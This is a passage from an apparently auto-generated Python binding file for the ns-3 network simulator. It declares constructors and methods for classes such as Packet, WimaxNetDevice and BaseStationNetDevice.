is_const=True)
cls.add_method('GetDevice',
'ns3::Ptr< ns3::NetDevice >',
[param('uint32_t', 'index')],
is_const=True)
cls.add_method('GetId',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNApplications',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNDevices',
'uint32_t',
[],
is_const=True)
cls.add_method('GetSystemId',
'uint32_t',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('RegisterDeviceAdditionListener',
'void',
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'listener')])
cls.add_method('RegisterProtocolHandler',
'void',
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'handler'), param('uint16_t', 'protocolType'), param('ns3::Ptr< ns3::NetDevice >', 'device'), param('bool', 'promiscuous', default_value='false')])
cls.add_method('UnregisterDeviceAdditionListener',
'void',
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'listener')])
cls.add_method('UnregisterProtocolHandler',
'void',
[param('ns3::Callback< void, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'handler')])
cls.add_method('DoDispose',
'void',
[],
visibility='protected', is_virtual=True)
cls.add_method('DoStart',
'void',
[],
visibility='protected', is_virtual=True)
return
def register_Ns3ObjectFactoryChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::ObjectFactoryChecker const &', 'arg0')])
return
def register_Ns3ObjectFactoryValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::ObjectFactoryValue const &', 'arg0')])
cls.add_constructor([param('ns3::ObjectFactory const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::ObjectFactory',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::ObjectFactory const &', 'value')])
return
def register_Ns3OutputStreamWrapper_methods(root_module, cls):
cls.add_constructor([param('ns3::OutputStreamWrapper const &', 'arg0')])
cls.add_constructor([param('std::string', 'filename'), param('std::_Ios_Openmode', 'filemode')])
cls.add_constructor([param('std::ostream *', 'os')])
cls.add_method('GetStream',
'std::ostream *',
[])
return
def register_Ns3Packet_methods(root_module, cls):
cls.add_output_stream_operator()
cls.add_constructor([])
cls.add_constructor([param('ns3::Packet const &', 'o')])
cls.add_constructor([param('uint32_t', 'size')])
cls.add_constructor([param('uint8_t const *', 'buffer'), param('uint32_t', 'size'), param('bool', 'magic')])
cls.add_constructor([param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('AddAtEnd',
'void',
[param('ns3::Ptr< ns3::Packet const >', 'packet')])
cls.add_method('AddByteTag',
'void',
[param('ns3::Tag const &', 'tag')],
is_const=True)
cls.add_method('AddHeader',
'void',
[param('ns3::Header const &', 'header')])
cls.add_method('AddPacketTag',
'void',
[param('ns3::Tag const &', 'tag')],
is_const=True)
cls.add_method('AddPaddingAtEnd',
'void',
[param('uint32_t', 'size')])
cls.add_method('AddTrailer',
'void',
[param('ns3::Trailer const &', 'trailer')])
cls.add_method('BeginItem',
'ns3::PacketMetadata::ItemIterator',
[],
is_const=True)
cls.add_method('Copy',
'ns3::Ptr< ns3::Packet >',
[],
is_const=True)
cls.add_method('CopyData',
'uint32_t',
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')],
is_const=True)
cls.add_method('CopyData',
'void',
[param('std::ostream *', 'os'), param('uint32_t', 'size')],
is_const=True)
cls.add_method('CreateFragment',
'ns3::Ptr< ns3::Packet >',
[param('uint32_t', 'start'), param('uint32_t', 'length')],
is_const=True)
cls.add_method('EnableChecking',
'void',
[],
is_static=True)
cls.add_method('EnablePrinting',
'void',
[],
is_static=True)
cls.add_method('FindFirstMatchingByteTag',
'bool',
[param('ns3::Tag &', 'tag')],
is_const=True)
cls.add_method('GetByteTagIterator',
'ns3::ByteTagIterator',
[],
is_const=True)
cls.add_method('GetNixVector',
'ns3::Ptr< ns3::NixVector >',
[],
is_const=True)
cls.add_method('GetPacketTagIterator',
'ns3::PacketTagIterator',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetUid',
'uint64_t',
[],
is_const=True)
cls.add_method('PeekData',
'uint8_t const *',
[],
deprecated=True, is_const=True)
cls.add_method('PeekHeader',
'uint32_t',
[param('ns3::Header &', 'header')],
is_const=True)
cls.add_method('PeekPacketTag',
'bool',
[param('ns3::Tag &', 'tag')],
is_const=True)
cls.add_method('PeekTrailer',
'uint32_t',
[param('ns3::Trailer &', 'trailer')])
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True)
cls.add_method('PrintByteTags',
'void',
[param('std::ostream &', 'os')],
is_const=True)
cls.add_method('PrintPacketTags',
'void',
[param('std::ostream &', 'os')],
is_const=True)
cls.add_method('RemoveAllByteTags',
'void',
[])
cls.add_method('RemoveAllPacketTags',
'void',
[])
cls.add_method('RemoveAtEnd',
'void',
[param('uint32_t', 'size')])
cls.add_method('RemoveAtStart',
'void',
[param('uint32_t', 'size')])
cls.add_method('RemoveHeader',
'uint32_t',
[param('ns3::Header &', 'header')])
cls.add_method('RemovePacketTag',
'bool',
[param('ns3::Tag &', 'tag')])
cls.add_method('RemoveTrailer',
'uint32_t',
[param('ns3::Trailer &', 'trailer')])
cls.add_method('Serialize',
'uint32_t',
[param('uint8_t *', 'buffer'), param('uint32_t', 'maxSize')],
is_const=True)
cls.add_method('SetNixVector',
'void',
[param('ns3::Ptr< ns3::NixVector >', 'arg0')])
return
def register_Ns3RandomVariableChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::RandomVariableChecker const &', 'arg0')])
return
def register_Ns3RandomVariableValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::RandomVariableValue const &', 'arg0')])
cls.add_constructor([param('ns3::RandomVariable const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::RandomVariable',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::RandomVariable const &', 'value')])
return
def register_Ns3SimpleOfdmWimaxPhy_methods(root_module, cls):
cls.add_constructor([param('ns3::SimpleOfdmWimaxPhy const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('char *', 'tracesPath')])
cls.add_method('ActivateLoss',
'void',
[param('bool', 'loss')])
cls.add_method('DoAttach',
'void',
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')],
is_virtual=True)
cls.add_method('GetBandwidth',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNoiseFigure',
'double',
[],
is_const=True)
cls.add_method('GetPhyType',
'ns3::WimaxPhy::PhyType',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTxPower',
'double',
[],
is_const=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('NotifyRxBegin',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('NotifyRxDrop',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('NotifyRxEnd',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('NotifyTxBegin',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('NotifyTxDrop',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('NotifyTxEnd',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('Send',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction')])
cls.add_method('Send',
'void',
[param('ns3::SendParams *', 'params')],
is_virtual=True)
cls.add_method('SetBandwidth',
'void',
[param('uint32_t', 'BW')])
cls.add_method('SetNoiseFigure',
'void',
[param('double', 'nf')])
cls.add_method('SetReceiveCallback',
'void',
[param('ns3::Callback< void, ns3::Ptr< ns3::PacketBurst >, ns3::Ptr< ns3::WimaxConnection >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')])
cls.add_method('SetSNRToBlockErrorRateTracesPath',
'void',
[param('char *', 'tracesPath')])
cls.add_method('SetTxPower',
'void',
[param('double', 'txPower')])
cls.add_method('StartReceive',
'void',
[param('uint32_t', 'burstSize'), param('bool', 'isFirstBlock'), param('uint64_t', 'frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'rxPower'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')])
cls.add_method('DoDispose',
'void',
[],
visibility='private', is_virtual=True)
cls.add_method('DoGetDataRate',
'uint32_t',
[param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetFrameDuration',
'ns3::Time',
[param('uint8_t', 'frameDurationCode')],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetFrameDurationCode',
'uint8_t',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetGValue',
'double',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNfft',
'uint16_t',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNrBytes',
'uint64_t',
[param('uint32_t', 'symbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNrSymbols',
'uint64_t',
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetRtg',
'uint16_t',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetSamplingFactor',
'double',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetSamplingFrequency',
'double',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetTransmissionTime',
'ns3::Time',
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetTtg',
'uint16_t',
[],
is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoSetDataRates',
'void',
[],
visibility='private', is_virtual=True)
cls.add_method('DoSetPhyParameters',
'void',
[],
visibility='private', is_virtual=True)
return
def register_Ns3TimeChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TimeChecker const &', 'arg0')])
return
def register_Ns3TimeValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TimeValue const &', 'arg0')])
cls.add_constructor([param('ns3::Time const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::Time',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::Time const &', 'value')])
return
def register_Ns3TypeIdChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TypeIdChecker const &', 'arg0')])
return
def register_Ns3TypeIdValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TypeIdValue const &', 'arg0')])
cls.add_constructor([param('ns3::TypeId const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::TypeId',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::TypeId const &', 'value')])
return
def register_Ns3UintegerValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::UintegerValue const &', 'arg0')])
cls.add_constructor([param('uint64_t const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'uint64_t',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('uint64_t const &', 'value')])
return
def register_Ns3WimaxChannel_methods(root_module, cls):
cls.add_constructor([param('ns3::WimaxChannel const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Attach',
'void',
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')])
cls.add_method('GetDevice',
'ns3::Ptr< ns3::NetDevice >',
[param('uint32_t', 'i')],
is_const=True, is_virtual=True)
cls.add_method('GetNDevices',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('DoAttach',
'void',
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')],
is_pure_virtual=True, visibility='private', is_virtual=True)
cls.add_method('DoGetDevice',
'ns3::Ptr< ns3::NetDevice >',
[param('uint32_t', 'i')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
cls.add_method('DoGetNDevices',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3WimaxNetDevice_methods(root_module, cls):
cls.add_static_attribute('m_direction', 'uint8_t', is_const=False)
cls.add_static_attribute('m_frameStartTime', 'ns3::Time', is_const=False)
cls.add_instance_attribute('m_traceRx', 'ns3::TracedCallback< ns3::Ptr< ns3::Packet const >, ns3::Mac48Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', is_const=False)
cls.add_instance_attribute('m_traceTx', 'ns3::TracedCallback< ns3::Ptr< ns3::Packet const >, ns3::Mac48Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', is_const=False)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetTtg',
'void',
[param('uint16_t', 'ttg')])
cls.add_method('GetTtg',
'uint16_t',
[],
is_const=True)
cls.add_method('SetRtg',
'void',
[param('uint16_t', 'rtg')])
cls.add_method('GetRtg',
'uint16_t',
[],
is_const=True)
cls.add_method('Attach',
'void',
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')])
cls.add_method('SetPhy',
'void',
[param('ns3::Ptr< ns3::WimaxPhy >', 'phy')])
cls.add_method('GetPhy',
'ns3::Ptr< ns3::WimaxPhy >',
[],
is_const=True)
cls.add_method('SetChannel',
'void',
[param('ns3::Ptr< ns3::WimaxChannel >', 'wimaxChannel')])
cls.add_method('GetChannel',
'uint64_t',
[param('uint8_t', 'index')],
is_const=True)
cls.add_method('SetNrFrames',
'void',
[param('uint32_t', 'nrFrames')])
cls.add_method('GetNrFrames',
'uint32_t',
[],
is_const=True)
cls.add_method('SetMacAddress',
'void',
[param('ns3::Mac48Address', 'address')])
cls.add_method('GetMacAddress',
'ns3::Mac48Address',
[],
is_const=True)
cls.add_method('SetState',
'void',
[param('uint8_t', 'state')])
cls.add_method('GetState',
'uint8_t',
[],
is_const=True)
cls.add_method('GetInitialRangingConnection',
'ns3::Ptr< ns3::WimaxConnection >',
[],
is_const=True)
cls.add_method('GetBroadcastConnection',
'ns3::Ptr< ns3::WimaxConnection >',
[],
is_const=True)
cls.add_method('SetCurrentDcd',
'void',
[param('ns3::Dcd', 'dcd')])
cls.add_method('GetCurrentDcd',
'ns3::Dcd',
[],
is_const=True)
cls.add_method('SetCurrentUcd',
'void',
[param('ns3::Ucd', 'ucd')])
cls.add_method('GetCurrentUcd',
'ns3::Ucd',
[],
is_const=True)
cls.add_method('GetConnectionManager',
'ns3::Ptr< ns3::ConnectionManager >',
[],
is_const=True)
cls.add_method('SetConnectionManager',
'void',
[param('ns3::Ptr< ns3::ConnectionManager >', 'connectionManager')],
is_virtual=True)
cls.add_method('GetBurstProfileManager',
'ns3::Ptr< ns3::BurstProfileManager >',
[],
is_const=True)
cls.add_method('SetBurstProfileManager',
'void',
[param('ns3::Ptr< ns3::BurstProfileManager >', 'burstProfileManager')])
cls.add_method('GetBandwidthManager',
'ns3::Ptr< ns3::BandwidthManager >',
[],
is_const=True)
cls.add_method('SetBandwidthManager',
'void',
[param('ns3::Ptr< ns3::BandwidthManager >', 'bandwidthManager')])
cls.add_method('CreateDefaultConnections',
'void',
[])
cls.add_method('Start',
'void',
[],
is_pure_virtual=True, is_virtual=True)
cls.add_method('Stop',
'void',
[],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetReceiveCallback',
'void',
[])
cls.add_method('ForwardUp',
'void',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Mac48Address const &', 'source'), param('ns3::Mac48Address const &', 'dest')])
cls.add_method('Enqueue',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('ForwardDown',
'void',
[param('ns3::Ptr< ns3::PacketBurst >', 'burst'), param('ns3::WimaxPhy::ModulationType', 'modulationType')])
cls.add_method('SetName',
'void',
[param('std::string const', 'name')],
is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True, is_virtual=True)
cls.add_method('SetIfIndex',
'void',
[param('uint32_t const', 'index')],
is_virtual=True)
cls.add_method('GetIfIndex',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetPhyChannel',
'ns3::Ptr< ns3::Channel >',
[],
is_const=True, is_virtual=True)
cls.add_method('GetChannel',
'ns3::Ptr< ns3::Channel >',
[],
is_const=True, is_virtual=True)
cls.add_method('SetAddress',
'void',
[param('ns3::Address', 'address')],
is_virtual=True)
cls.add_method('GetAddress',
'ns3::Address',
[],
is_const=True, is_virtual=True)
cls.add_method('SetMtu',
'bool',
[param('uint16_t const', 'mtu')],
is_virtual=True)
cls.add_method('GetMtu',
'uint16_t',
[],
is_const=True, is_virtual=True)
cls.add_method('IsLinkUp',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('SetLinkChangeCallback',
'void',
[param('ns3::Callback< void, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')],
is_virtual=True)
cls.add_method('IsBroadcast',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('GetBroadcast',
'ns3::Address',
[],
is_const=True, is_virtual=True)
cls.add_method('IsMulticast',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('GetMulticast',
'ns3::Address',
[],
is_const=True, is_virtual=True)
cls.add_method('MakeMulticastAddress',
'ns3::Address',
[param('ns3::Ipv4Address', 'multicastGroup')],
is_const=True, is_virtual=True)
cls.add_method('IsPointToPoint',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('Send',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],
is_virtual=True)
cls.add_method('SetNode',
'void',
[param('ns3::Ptr< ns3::Node >', 'node')],
is_virtual=True)
cls.add_method('GetNode',
'ns3::Ptr< ns3::Node >',
[],
is_const=True, is_virtual=True)
cls.add_method('NeedsArp',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('SetReceiveCallback',
'void',
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'cb')],
is_virtual=True)
cls.add_method('AddLinkChangeCallback',
'void',
[param('ns3::Callback< void, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')],
is_virtual=True)
cls.add_method('SendFrom',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'source'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],
is_virtual=True)
cls.add_method('SetPromiscReceiveCallback',
'void',
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'cb')],
is_virtual=True)
cls.add_method('GetPromiscReceiveCallback',
'ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >',
[])
cls.add_method('SupportsSendFrom',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('DoDispose',
'void',
[],
is_virtual=True)
cls.add_method('GetMulticast',
'ns3::Address',
[param('ns3::Ipv6Address', 'addr')],
is_const=True, is_virtual=True)
cls.add_method('GetMulticast',
'ns3::Address',
[param('ns3::Ipv4Address', 'multicastGroup')],
is_const=True, is_virtual=True)
cls.add_method('IsBridge',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('IsPromisc',
'bool',
[])
cls.add_method('NotifyPromiscTrace',
'void',
[param('ns3::Ptr< ns3::Packet >', 'p')])
cls.add_method('DoSend',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Mac48Address const &', 'source'), param('ns3::Mac48Address const &', 'dest'), param('uint16_t', 'protocolNumber')],
is_pure_virtual=True, visibility='private', is_virtual=True)
cls.add_method('DoReceive',
'void',
[param('ns3::Ptr< ns3::Packet >', 'packet')],
is_pure_virtual=True, visibility='private', is_virtual=True)
cls.add_method('DoGetChannel',
'ns3::Ptr< ns3::WimaxChannel >',
[],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3AddressChecker_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::AddressChecker const &', 'arg0')])
return
def register_Ns3AddressValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::AddressValue const &', 'arg0')])
cls.add_constructor([param('ns3::Address const &', 'value')])
cls.add_method('Copy',
'ns3::Ptr< ns3::AttributeValue >',
[],
is_const=True, is_virtual=True)
cls.add_method('DeserializeFromString',
'bool',
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_virtual=True)
cls.add_method('Get',
'ns3::Address',
[],
is_const=True)
cls.add_method('SerializeToString',
'std::string',
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],
is_const=True, is_virtual=True)
cls.add_method('Set',
'void',
[param('ns3::Address const &', 'value')])
return
def register_Ns3BaseStationNetDevice_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::Node >', 'node'), param('ns3::Ptr< ns3::WimaxPhy >', 'phy')])
cls.add_constructor([param('ns3::Ptr< ns3::Node >', 'node'), param('ns3::Ptr< ns3::WimaxPhy >', 'phy'), param('ns3::Ptr< ns3::UplinkScheduler >', 'uplinkScheduler'), param('ns3::Ptr< ns3::BSScheduler >', 'bsScheduler')])
cls.add_method('SetInitialRangingInterval',
'void',
[param('ns3::Time', 'initialRangInterval')])
cls.add_method('InitBaseStationNetDevice',
'void',
[])
cls.add_method('GetInitialRangingInterval',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetDcdInterval',
'void',
[param('ns3::Time', 'dcdInterval')])
cls.add_method('GetDcdInterval',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetUcdInterval',
'void',
[param('ns3::Time', 'ucdInterval')])
cls.add_method('GetUcdInterval',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetIntervalT8',
'void',
[param('ns3::Time', 'interval')])
cls.add_method('GetIntervalT8',
'ns3::Time',
[],
is_const=True)
cls.add_method('SetMaxRangingCorrectionRetries',
'void',
[param('uint8_t', 'maxRangCorrectionRetries')])
cls.add_method('GetMaxRangingCorrectionRetries',
'uint8_t',
[],
is_const=True)
cls.add_method('SetMaxInvitedRangRetries',
'void',
[param('uint8_t', 'maxInvitedRangRetries')])
cls.add_method('GetMaxInvitedRangRetries',
'uint8_t',
[],
is_const=True)
cls.add_method('SetRangReqOppSize',
'void',
[param('uint8_t', 'rangReqOppSize')])
cls.add_method('GetRangReqOppSize',
'uint8_t',
[],
is_const=True)
cls.add_method('SetBwReqOppSize',
'void',
[param('uint8_t', 'bwReqOppSize')])
cls.add_method('GetBwReqOppSize',
'uint8_t',
[],
is_const=True)
cls.add_method('SetNrDlSymbols',
'void',
[param('uint32_t', 'dlSymbols')])
cls.add_method('GetNrDlSymbols',
'uint32_t',
[],
is_const=True)
cls.add_method('SetNrUlSymbols',
'void',
[param('uint32_t', 'ulSymbols')])
cls.add_method('GetNrUlSymbols',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNrDcdSent',
'uint32_t',
[],
is_const=True)
cls.add_method('GetNrUcdSent',
'uint32_t',
[],
is_const=True)
cls.add_method('GetDlSubframeStartTime',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetUlSubframeStartTime',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetRangingOppNumber',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSSManager',
'ns3::Ptr< ns3::SSManager >',
[],
is_const=True)
cls.add_method('SetSSManager',
'void',
[param('ns3::Ptr< ns3::SSManager >', 'ssManager')])
cls.add_method('GetUplinkScheduler',
'ns3::Ptr< ns3::UplinkScheduler >',
[],
is_const=True)
cls.add_method('SetUplinkScheduler',
'void',
[param('ns3::Ptr< ns3::UplinkScheduler >', 'ulScheduler')])
cls.add_method('GetLinkManager',
'ns3::Ptr< ns3::BSLinkManager >',
[],
is_const=True)
cls.add_method('SetBSScheduler',
'void',
[param('ns3::Ptr< ns3::BSScheduler >', 'bsSchedule')])
cls.add_method('GetBSScheduler',
'ns3::Ptr< ns3::BSScheduler >',
[],
is_const=True)
cls.add_method('SetLinkManager',
'void',
[param('ns3::Ptr< ns3::BSLinkManager >', 'linkManager')])
cls.add_method('GetBsClassifier',
'ns3::Ptr< ns3::IpcsClassifier >',
[],
is_const=True)
cls.add_method('SetBsClassifier',
'void',
[param('ns3::Ptr< ns3::IpcsClassifier >', 'classifier')])
cls.add_method('GetPsDuration',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetSymbolDuration',
'ns3::Time',
[],
is_const=True)
cls.add_method('Start',
'void',
[],
is_virtual=True)
cls.add_method('Stop',
'void',
[],
is_virtual=True)
cls.add_method('Enqueue',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::Ptr< ns3::WimaxConnection >', 'connection')],
is_virtual=True)
cls.add_method('GetConnection',
'ns3::Ptr< ns3::WimaxConnection >',
[param('ns3::Cid', 'cid')])
cls.add_method('MarkUplinkAllocations',
'void',
[])
cls.add_method('MarkRangingOppStart',
'void',
[param('ns3::Time', 'rangingOppStartTime')])
cls.add_method('GetServiceFlowManager',
'ns3::Ptr< ns3::BsServiceFlowManager >',
[],
is_const=True)
cls.add_method('SetServiceFlowManager',
'void',
[param('ns3::Ptr< ns3::BsServiceFlowManager >', 'arg0')])
cls.add_method('DoDispose',
'void',
[],
visibility='private', is_virtual=True)
cls.add_method('DoSend',
'bool',
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Mac48Address const &', 'source'), param('ns3::Mac48Address const &', 'dest'), param('uint16_t', 'protocolNumber')],
visibility='private', is_virtual=True)
cls.add_method('DoReceive',
'void',
[param('ns3::Ptr< ns3::Packet >', 'packet')],
visibility='private', is_virtual=True)
return
def register_Ns3SimpleOfdmWimaxChannel_methods(root_module, cls):
cls.add_constructor([param('ns3::SimpleOfdmWimaxChannel const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleOfdmWimaxChannel::PropModel', 'propModel')])
cls.add_method('Send',
'void',
